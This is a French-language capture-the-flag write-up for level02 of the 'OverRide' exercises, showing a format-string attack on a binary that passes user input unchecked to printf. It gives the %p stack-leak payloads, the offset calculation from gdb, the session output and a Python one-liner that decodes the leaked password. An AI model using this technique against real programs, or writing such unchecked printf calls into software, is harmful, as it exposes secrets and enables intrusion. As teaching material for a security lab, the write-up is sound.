
En decompilant le programe on ce rend compte qu'un __printf__ est exploitable.
Aussi pour ce rend compte que le flag est set dans un variable en amont du code.

```c
stream = fopen("/home/users/level03/.pass", "r");
if ( !stream ){
	fwrite("ERROR: failed to open password file\n", 1uLL, 0x24uLL, stderr);
	exit(1);
}
v9 = fread(ptr, 1uLL, 0x29uLL, stream);
ptr[strcspn(ptr, "\n")] = 0;
```

```c
if ( strncmp(ptr, s2, 0x29uLL) ){
	printf(s);
	puts(" does not have access!");
	exit(1);
}
```

en printant cette ligne dans dans la premiere input du programe:

> AAAAAAAA %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p

On obtient:
> AAAAAAAA 0x7fffffffe4f0 (nil) (nil) 0x2a2a2a2a2a2a2a2a 0x2a2a2a2a2a2a2a2a 0x7fffffffe6e8 0x1f7ff9a08 (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) 0x100000000 (nil) 0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d 0xfeff00 ==0x4141414141414141== 0x2520702520702520 0x2070252070252070 does not have access!

on trouve un offset de __28__ (position de la chaine "AAAAAAAA" dans les adresses)

en utilisant __gdb__, on trouve dans la fonction main la position dans la stack de la chaine print par __printf__ et la position de la chaine contenant le __flag__.

			flag -> 0x0000000000400a51 <+573>:	lea    rax,[rbp-0xa0]
	chaine print -> 0x0000000000400a71 <+605>:	lea    rdx,[rbp-0x70]
	0xa0 - 0x70 = 48

grace au calcule : 
> [offset] - ([distance] / [nb octets print par %p])

soit :
> 28 - (48 / 8) = 22

On trouve le decalage pour recuperer la premiere partie du flag (les 8 premier charactere).
Il suffit donc de recupere : 40 / 8 = 5 partie.

Du coup voici la ligne a executer:

 > \%22\$p \%23\$p \%24\$p \%25\$p \%26\$p

On obtient donc ceci :

```bash

level02@OverRide:~$ ./level02 
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: %22$p %23$p %24$p %25$p %26$p
--[ Password: 
*****************************************
0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d does not have access!
```

En decodant les 5 parties on obtient le flag.

> python -c "print ''.join([v.decode('hex')[::-1] for v in ['756e505234376848', '45414a3561733951', '377a7143574e6758', '354a35686e475873', '48336750664b394d']])"